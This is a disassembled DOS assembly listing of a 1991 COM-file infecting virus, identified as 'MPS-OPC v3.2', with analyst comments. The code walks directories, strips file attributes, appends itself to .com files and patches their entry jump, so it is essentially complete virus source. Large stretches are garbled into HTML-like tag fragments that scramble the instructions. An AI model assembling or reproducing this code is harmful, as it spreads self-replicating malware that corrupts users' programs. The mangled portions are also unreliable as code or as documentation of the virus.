

seg_a	segment	byte public
	assume	cs:seg_a, ds:seg_a
	org	100h

start:	inc	dx					;0100 42
	jmp	l_0170					;0101 E9 006C

;--------------------------------------------------------
	mov	dx,offset d_010F			;0104
	mov	ah,09h
	int	21h
	mov	ah,4Ch
	int	21h
d_010F	db	'Juliusz Stepinski   Marzec 1991   Instalator wirusow.'
	db	0Ah,0Dh
	db	'Masz zainstalowanego wirusa COM 654 !!!'
	db	0Ah,0Dh,'$'

;========================================================
l_0170:	call	s_017B					;0170 E8 0008
	sub	ax,3					;0173 2D 0003
	mov	si,ax					;0176 8B F0
	jmp	short l_0183				;0178 EB 09
	nop						;017A 90

			;<----- get="" virus="" base="" address="" s_017b="" proc="" near="" mov="" di,0="" ;017b.bf="" 0000="" mov="" bp,sp="" ;017e="" 8b="" ec="" mov="" ax,[bp+di]="" ;0180="" 8b="" 03="" retn="" ;0182="" c3="" s_017b="" endp=""></-----><----- check="" virus="" name="" l_0183:="" mov="" di,270h="" ;d_03e0="" ;0183.bf="" 0270="" add="" di,si="" ;0186="" 03="" fe="" mov="" cx,17h="" ;0188="" b9="" 0017="" xor="" ax,ax="" ;018b="" 33="" c0="" l_018d:="" xor="" ah,[di]="" ;018d="" 32="" 25="" ror="" ah,1="" ;018f="" d0="" cc="" inc="" di="" ;0191="" 47="" loop="" l_018d="" ;0192="" e2="" f9="" cmp="" ah,43h="" ;0194="" 80="" fc="" 43="" jne="" l_0183="" ;false="" name,="" hang="" up="" ;0197="" 75="" ea=""></-----><------ restore="" victim="" bytes="" push="" si="" ;0199="" 56="" mov="" cx,4="" ;019a="" b9="" 0004="" add="" si,287h="" ;d_03f7="" ;019d.81="" c6="" 0287="" mov="" di,100h="" ;01a1.bf="" 0100="" rep="" movsb="" ;01a4="" f3/="" a4=""></------><----- decode="" hidden="" constans="" pop="" si="" ;01a6="" 5e="" mov="" cx,0ah="" ;01a7="" b9="" 000a="" mov="" di,266h="" ;d_03d6="" ;01aa.bf="" 0266="" add="" di,si="" ;01ad="" 03="" fe="" l_01af:="" mov="" ah,[di]="" ;01af="" 8a="" 25="" xor="" ah,0a7h="" ;01b1="" 80="" f4="" a7="" mov="" [di+28h],ah="" ;d_03fe="" ;01b4="" 88="" 65="" 28="" nop="" ;01b7="" 90="" inc="" di="" ;01b8="" 47="" loop="" l_01af="" ;01b9="" e2="" f4=""></-----><------ mov="" word="" ptr="" ds:[si+2e6h],3a5ch="" ;d_456="" ;01bb="" c7="" 84="" 02e6="" 3a5c="" mov="" word="" ptr="" ds:[si+2e8h],015ch="" ;d_458="" ;01c1="" c7="" 84="" 02e8="" 015c=""></------><----- generation="" number="" increment="" mov="" ax,word="" ptr="" ds:[si+28ch]="" ;d_03fc="" ;01c7="" 8b="" 84="" 028c="" inc="" ax="" ;01cb="" 40="" mov="" word="" ptr="" ds:[si+28ch],ax="" ;01cc="" 89="" 84="" 028c="" mov="" ah,2fh="" ;get="" dta="" ptr="" into="" es:bx="" ;01d0="" b4="" 2f="" int="" 21h="" ;01d2="" cd="" 21="" mov="" word="" ptr="" ds:[si+29ch],bx="" ;d_040c="" ;01d4="" 89="" 9c="" 029c="" mov="" ax,es="" ;01d8="" 8c="" c0="" mov="" word="" ptr="" ds:[si+29eh],ax="" ;d_040e="" ;01da="" 89="" 84="" 029e="" mov="" ax,ds="" ;01de="" 8c="" d8="" mov="" es,ax="" ;01e0="" 8e="" c0="" mov="" ah,1ah="" ;set="" dta="" ;01e2="" b4="" 1a="" mov="" dx,2a2h="" ;d_0412="" ;01e4.ba="" 02a2="" add="" dx,si="" ;01e7="" 03="" d6="" int="" 21h="" ;01e9="" cd="" 21="" push="" si="" ;01eb="" 56="" add="" si,2e9h="" ;d_0459="" -="" target="" ;01ec.81="" c6="" 02e9="" xor="" dl,dl="" ;current="" drive="" ;01f0="" 32="" d2="" mov="" ah,47h="" ;get="" present="" dir="" ;01f2="" b4="" 47="" int="" 21h="" ;01f4="" cd="" 21="" pop="" si="" ;01f6="" 5e="" mov="" di,si="" ;01f7="" 8b="" fe="" add="" di,2e9h="" ;d_0459="" ;01f9.81="" c7="" 02e9="" call="" s_02ac=""></-----><-> Find end of path	;01FD E8 00AC
	mov	bx,0		;subdirectories count	;0200 BB 0000

	mov	cx,10h		;attribute "directory"	;0203 B9 0010
	mov	dx,28Eh		;d_03FE	= '*.*'		;0206.BA 028E
	add	dx,si					;0209 03 D6
	mov	ah,4Eh		;find 1st filename match;020B B4 4E
	int	21h					;020D CD 21
	jc	l_0267		;-> no subdirectories	;020F 72 56

l_0211:	call	s_0295		;Validate founded dir	;0211 E8 0081
	jc	l_0217		;-> not passed		;0214 72 01
	inc	bx					;0216 43
l_0217:	mov	dx,2A2h		;d_0412 = DTA		;0217 BA 02A2
	add	dx,si					;021A 03 D6
	mov	ah,4Fh		;find nxt filename match;021C B4 4F
	int	21h					;021E CD 21
	jnc	l_0211		;-> found		;0220 73 EF
	or	bl,bl		;subdirs count = Zero ?	;0222 0A DB
	jz	l_0267		;-> yes, not found	;0224 74 41

			;<- choose="" subdirectory="" mov="" ah,2ch="" ;get="" time="" ;0226="" b4="" 2c="" int="" 21h="" ;0228="" cd="" 21="" ;cx="hrs/min," dh="sec" l_022a:="" cmp="" bl,dl="" ;hundreth="" of="" seconds="" ;022a="" 3a="" da="" jae="" l_0232="" ;-=""> o.k.		;022C 73 04

	sub	dl,bl		;hundreth - subdirs cnt	;022E 2A D3
	jmp	short l_022A				;0230 EB F8

l_0232:	mov	bl,dl		;number of subdir to get;0232 8A DA
	mov	dx,28Eh		;d_03FE = '*.*'		;0234.BA 028E
	add	dx,si					;0237 03 D6
	mov	cx,10h		;attr = directory	;0239 B9 0010
	mov	ah,4Eh		;;find 1st filenam match;023C B4 4E
	int	21h					;023E CD 21

	call	s_0295		;Validate founded dir	;0240 E8 0052
	jc	l_0249		;-> not passed		;0243 72 04
	dec	bl					;0245 FE CB
	jz	l_025B		;-> found		;0247 74 12

l_0249:	mov	dx,2A2h		;d_0412			;0249 BA 02A2
	add	dx,si					;024C 03 D6
	mov	ah,4Fh		;find nxt filename match;024E B4 4F
	int	21h					;0250 CD 21

	call	s_0295		;Validate founded dir	;0252 E8 0040
	jc	l_0249		;-> not passed		;0255 72 F2
	dec	bl					;0257 FE CB
	jnz	l_0249		;-> not chosed directory;0259 75 EE
l_025B:	inc	di					;025B 47
	call	s_03B8		;Concat. path & new dir	;025C E8 0159
	mov	di,2E8h		;d_0458	= work path	;025F.BF 02E8
	add	di,si					;0262 03 FE
	call	s_02AC		;<-> Find end of path	;0264 E8 0045

				;<----- full="" path="" ready="" l_0267:="" mov="" cx,40h="" ;path="" length="" ;0267="" b9="" 0040="" mov="" al,5ch="" ;'\'="" ;026a="" b0="" 5c="" std="" ;026c="" fd="" repne="" scasb="" ;026d="" f2/="" ae="" cld="" ;026f="" fc="" add="" di,2="" ;char="" after="" '\'="" ;0270="" 83="" c7="" 02="" mov="" al,':'="" ;0273="" b0="" 3a="" cmp="" al,[di]="" ;0275="" 3a="" 05="" je="" l_0292="" ;-="">End of search;0277  74 19

	mov	word ptr ds:[si+2A0h],di	;d_0410	;0279  89 BC 02A0
	push	di					;027D  57
	push	si					;027E  56
	add	si,292h		;d_0402 = '*.com'	;027F .81 C6 0292
	mov	cx,6					;0283  B9 0006
	rep	movsb		;name & path concat.	;0286  F3/ A4
	pop	si					;0288  5E

	call	s_02C1		;contamine files in dir	;0289  E8 0035
	pop	di					;028C  5F
	sub	di,2					;028D  83 EF 02
	jmp	short l_0267				;0290  EB D5

l_0292:	jmp	l_0382					;0292  E9 00ED

;========================================================
;	Validate founded directory
;--------------------------------------------------------
s_0295	proc	near
	clc						;0295  F8
	mov	ah,byte ptr ds:[si+2C0h]	;d_0430	;0296  8A A4 02C0
	cmp	ah,'.'		;current or parent dir?	;029A  80 FC 2E
	je	l_02A9		;-> yes			;029D  74 0A

	mov	ah,byte ptr ds:[si+2B7h]	;d_0427	;029F  8A A4 02B7
	cmp	ah,10h		;directory ?		;02A3  80 FC 10
	jne	l_02A9		;-> no			;02A6  75 01

l_02A8:	retn						;02A8  C3

l_02A9:	stc			;false			;02A9  F9
	jmp	short l_02A8				;02AA  EB FC
s_0295	endp


;========================================================
;	Find end of path
;--------------------------------------------------------
s_02AC	proc	near
	xor	al,al		;End Of Path char = 0h	;02AC  32 C0
	mov	cx,40h		;max path length	;02AE  B9 0040
	repne	scasb					;02B1  F2/ AE
	cmp	cx,3Fh		;1 char path ?		;02B3  83 F9 3F
	je	l_02BE		;-> yes			;02B6  74 06
	mov	word ptr [di-1],'\'			;02B8  C7 45 FF 005C
	inc	di					;02BD  47
l_02BE:	dec	di					;02BE  4F
	dec	di					;02BF  4F
	;		....\directory\',0
	;			     *----- di point here	
	retn						;02C0  C3
s_02AC	endp


;========================================================
;	Contamine files in dir
;--------------------------------------------------------
s_02C1	proc	near
	mov	cx,0		;no attributes		;02C1 B9 0000
	mov	dx,2E8h		;d_0458 = work path	;02C4.BA 02E8
	add	dx,si					;02C7 03 D6
	mov	ah,4Eh		;find 1st filenam match	;02C9 B4 4E
	int	21h					;02CB CD 21
	jnc	l_02D2		;-> victim found	;02CD 73 03
	jmp	l_0381		;-> end of dir content	;02CF E9 00AF

l_02D2:	mov	ax,ds					;02D2 8C D8
	mov	es,ax					;02D4 8E C0
	call	s_03B4		;concatenate dir & fname;02D6 E8 00DB

l_02D9:	mov	ax,word ptr ds:[si+298h]	;d_0408	;02D9 8B 84 0298
	add	ax,42Eh		;filesiz+PSP+vir+work	;02DD 05 042E
	jnc	l_02E5		;-> O.K.		;02E0  73 03
	jmp	l_0369		;-> file to big		;02E2  E9 0084

l_02E5:	mov	dx,si					;02E5  8B D6
	add	dx,2E8h		;d_0458 - work path	;02E7 .81 C2 02E8
	mov	ax,4301h	;set file attrb		;02EB  B8 4301
	xor	cx,cx		;no attributes		;02EE  33 C9
	int	21h					;02F0  CD 21

	mov	ax,3D02h	;open file r/w		;02F2  B8 3D02
	int	21h					;02F5  CD 21
	jnc	l_02FC		;-> O.K.		;02F7  73 03
	jmp	l_0381		;-> error, return	;02F9  E9 0085

l_02FC:	mov	bx,ax		;file handle		;02FC  8B D8
	mov	ah,3Fh		;read file		;02FE  B4 3F
	mov	dx,si					;0300  8B D6
	add	dx,2D2h		;d_0442			;0302 .81 C2 02D2
	mov	cx,0Ah		;bytes to read		;0306  B9 000A
	int	21h					;0309  CD 21
	jnc	l_0310		;-> O.K.		;030B  73 03
	jmp	short l_0381	;-> eror, return	;030D  EB 72
	nop						;030F  90

l_0310:	mov	ax,4200h	;move file ptr BOF+offs	;0310  B8 4200
	xor	dx,dx					;0313  33 D2
	xor	cx,cx					;0315  33 C9
	int	21h					;0317  CD 21

	mov	ax,word ptr ds:[si+2D2h];d_0442=buffer	;0319  8B 84 02D2
	cmp	ax,0E942h	;vir signature		;031D  3D E942
	jne	l_0325		;-> not contamined	;0320  75 03
	jmp	l_03B2		;-> contamined		;0322  E9 008D

				;<- save="" victim="" bytes="" l_0325:="" mov="" cx,4="" ;0325="" b9="" 0004="" mov="" di,si="" ;0328="" 8b="" fe="" l_032a:="" mov="" ah,byte="" ptr="" ds:[di+2d2h]="" ;d_0442="" ;032a="" 8a="" a5="" 02d2="" mov="" byte="" ptr="" ds:[di+287h],ah="" ;d_03f7="" ;032e="" 88="" a5="" 0287="" inc="" di="" ;0332="" 47="" loop="" l_032a="" ;0333="" e2="" f5="" mov="" ax,0e942h="" ;0335="" b8="" e942="" mov="" word="" ptr="" ds:[si+2d2h],ax="" ;d_0442="" ;0338="" 89="" 84="" 02d2="" mov="" ax,word="" ptr="" ds:[si+298h]="" ;d_0408="" ;033c="" 8b="" 84="" 0298="" sub="" ax,4="" ;file="" size="" -="" vir="" begin="" code="" len="" ;0340="" 2d="" 0004="" mov="" word="" ptr="" ds:[si+2d2h+2],ax="" ;0343="" 89="" 84="" 02d4="" mov="" cx,4="" ;bytes="" to="" write="" ;0347="" b9="" 0004="" mov="" dx,offset="" ds:[2d2h]="" ;d_0442="buffer;034A" .ba="" 02d2="" add="" dx,si="" ;034d="" 03="" d6="" mov="" ah,40h="" ;write="" handle="" ;034f="" b4="" 40="" int="" 21h="" ;0351="" cd="" 21="" mov="" ax,4202h="" ;move="" file="" ptr="" eof+offs="" ;0353="" b8="" 4202="" xor="" dx,dx="" ;0356="" 33="" d2="" xor="" cx,cx="" ;0358="" 33="" c9="" int="" 21h="" ;035a="" cd="" 21="" mov="" dx,si="" ;virus="" begin="" ;035c="" 8b="" d6="" mov="" cx,28eh="" ;virus="" length="" ;035e="" b9="" 028e="" mov="" ah,40h="" ;write="" handle="" ;0361="" b4="" 40="" int="" 21h="" ;0363="" cd="" 21="" l_0365:="" mov="" ah,3eh="" ;close="" handle="" ;0365="" b4="" 3e="" int="" 21h="" ;0367="" cd="" 21="" l_0369:="" mov="" ah,4fh="" ;find="" next="" fname="" match="" ;0369="" b4="" 4f="" mov="" dx,2a2h="" ;036b="" ba="" 02a2="" add="" dx,si="" ;036e="" 03="" d6="" int="" 21h="" ;0370="" cd="" 21="" jc="" l_0381="" ;-=""> not found, return	;0372  72 0D

	mov	ax,0					;0374  B8 0000
	mov	word ptr ds:[si+298h],ax	;d_0408	;0377  89 84 0298
	call	s_03B4		;concatenate dir & fname;037B  E8 0036
	jmp	l_02D9		;-> contamine file	;037E  E9 FF58

l_0381:	retn						;0381  C3
s_02C1	endp

			;<--- after="" finished="" contamination="" l_0382:="" push="" ds="" ;0382="" 1e="" mov="" dx,word="" ptr="" ds:[si+29ch];victim="" dta="" offs;0383="" 8b="" 94="" 029c="" mov="" ax,word="" ptr="" ds:[si+29eh];victim="" dta="" seg="" ;0387="" 8b="" 84="" 029e="" mov="" ds,ax="" ;038b="" 8e="" d8="" mov="" ah,1ah="" ;set="" dta="" to="" ds:dx="" ;038d="" b4="" 1a="" int="" 21h="" ;038f="" cd="" 21="" pop="" ds="" ;0391="" 1f="" mov="" ax,si="" ;begin="" of="" virus="" ;0392="" 8b="" c6="" add="" ax,241h="" ;d_03b1="" ;0394="" 05="" 0241="" sub="" ax,100h="" ;start="" of="" victim="" ;0397="" 2d="" 0100="" xor="" bx,bx="" ;039a="" 33="" db="" sub="" bx,ax="" ;negate="" jmp="" distance="" ;039c="" 2b="" d8="" mov="" word="" ptr="" ds:[si+23fh],bx="" ;jmp="" ...;039e="" 89="" 9c="" 023f="" xor="" di,di="" ;03a2="" 33="" ff="" xor="" si,si="" ;03a4="" 33="" f6="" xor="" ax,ax="" ;03a6="" 33="" c0="" xor="" bx,bx="" ;03a8="" 33="" db="" xor="" dx,dx="" ;03aa="" 33="" d2="" xor="" cx,cx="" ;03ac="" 33="" c9="" jmp="" l_03b1="" ;-=""> jmp to victim	;03AE  E9 0000
l_03B1:	

	db	00h		;???			;03B1  00

				;<- file="" contaminated="" l_03b2:="" jmp="" short="" l_0365="" ;03b2="" eb="" b1="" ;="=======================================================" ;="" concatenate="" path="" &="" file="" name="" ;--------------------------------------------------------="" s_03b4:="" mov="" di,word="" ptr="" ds:[si+2a0h]="" ;d_0410="" ;03b4="" 8b="" bc="" a0="" 02="" ;="=======================================================" ;="" concatenate="" path="" &="" new="" directory="" ;--------------------------------------------------------="" s_03b8="" proc="" near="" push="" si="" ;03b8="" 56="" add="" si,2c0h="" ;d_0430="name" &="" ext="" ;03b9="" .81="" c6="" 02c0="" mov="" cx,0fh="" ;name="" length="" ;03bd="" b9="" 000f="" cld="" ;03c0="" fc="" rep="" movsb="" ;03c1="" f3/="" a4="" pop="" si="" ;03c3="" 5e="" push="" si="" ;03c4="" 56="" mov="" di,si="" ;03c5="" 8b="" fe="" add="" si,2bch="" ;d_042c="file" size="" ;03c7="" .81="" c6="" 02bc="" add="" di,298h="" ;d_0408="" ;03cb="" .81="" c7="" 0298="" mov="" cx,4="" ;03cf="" b9="" 0004="" rep="" movsb="" ;03d2="" f3/="" a4="" pop="" si="" ;03d4="" 5e="" retn="" ;03d5="" c3="" s_03b8="" endp=""></-><--- coded="" area="" d_03d6="" db="" 08dh,089h,08dh,0a7h="" ;03d6="" 8d="" 89="" 8d="" a7="" ;="" 02ah,02eh,02ah,000h="" ;uncoded="" value="" ;="" '*.*',0="" db="" 08dh,089h,0e4h,0e8h,0eah,0a7h="" ;03da="" 8d="" 89="" e4="" e8="" ea="" a7="" ;="" 02ah,02eh,043h,04fh,04dh,000h="" ;uncoded="" value="" ;="" '*.com',0=""></---><--- virus="" name="" (checked="" by="" virus)="" d_03e0="" db="" '="" (c)="" mps-opc="" 1991="" v3.2="" '="" ;03e0="" 20="" 28="" 43="" 29="" 20="" 4d="" 50="" ;03e7="" 53="" 2d="" 4f="" 50="" 43="" 20="" 31="" ;03ee="" 39="" 39="" 31="" 20="" 76="" 33="" 2e="" ;03f5="" 32="" 20=""></---><--- victim="" bytes="" d_03f7="" db="" 8ch,0c8h="" ;(mov="" ax,cs)="" ;03f7="" 8c="" c8="" db="" 8eh,0d8h="" ;(mov="" ds,ax)="" ;03f9="" 8e="" d8="" d_03fb="" db="" 00h="" ;03fb="" 00=""></---><----- virus="" generation="" number="" d_03fc="" dw="" 60h="" ;03fc="" 60="" 00="" ;--------------------------------="" end="" of="" virus="" code="" ------------=""></-----><------- working="" area="" -="" values="" init="" by="" virus="" d_03fe="" db="" '*.*',0="" d_0402="" db="" '*.com',0="" d_0408="" dd="" ;file="" size="" d_040c="" dw="" ;init="" dta="" address="" d_040e="" dw="" d_0410="" dw="" ;end="" of="" path="" d_0412="" db="" 15h="" dup="" (?)="" ;virus="" dta="" area="" d_0427="" db="" ;attribute="" dw="" ;time="" stamp="" dw="" ;date="" stamp="" d_042c="" dd="" ;file="" size="" d_0430="" db="" 18="" dup="" (?)="" ;name="" &="" extension="" d_0442="" db="" 10="" dup="" (?)="" ;file="" buffer="" d_044c="" db="" 10="" dup="" (?)="" d_0456="" db="" '\'=""></-------><- value="" to="" stop="" serching="" d_0457="" db="" ':'="" d_0458="" db="" '\'=""></-><- work="" path="" begin="" d_0459="" db="" 1="" ;present="" dir,drive="" (1="a:)" db="" 3fh="" dup="" (?)="" db="" 5="" dup="" (?)="" ;stack="" reserve="" d_049e="" label="" byte="" ;end="" of="" virus="" (l="32Eh)" seg_a="" ends="" end="" start="" =""></-></---></-></-----></-></-></->